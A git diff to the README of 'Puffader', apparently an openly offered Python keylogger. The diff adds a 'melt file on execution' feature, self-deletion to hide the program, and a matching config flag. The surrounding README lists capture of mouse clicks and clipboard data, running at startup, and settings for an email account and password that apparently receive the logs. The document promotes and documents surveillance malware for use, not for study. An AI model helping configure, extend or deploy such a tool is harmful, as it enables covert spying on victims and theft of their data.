@@ -28,13 +28,14 @@ Currently Puffader has several features such as:
 * Ability to capture window mouse clicks
 * Ability to run at startup
 * Ability to capture clipboard data
+* Ability to melt file on execution
 * Checking for multiple instances
 * And more...
 
 ## Quick Usage
 
 1. Open file with idle or any other editor.
-2. Modifiy lines `23-48` for your personal preference: eg.
+2. Modifiy lines `23-49` for your personal preference: eg.
 ```
 strEmailAc = "email@gmail.com"
 strEmailPass = "pass"
@@ -62,6 +63,7 @@ blnLogClick = "True"
 blnAddToStartup = "False"
 
 blnLogClipboard = "False"
+blnMelt = "False"
 ```
 > NOTE: For `strScrDir`, be sure to leave out the last `/`.
 
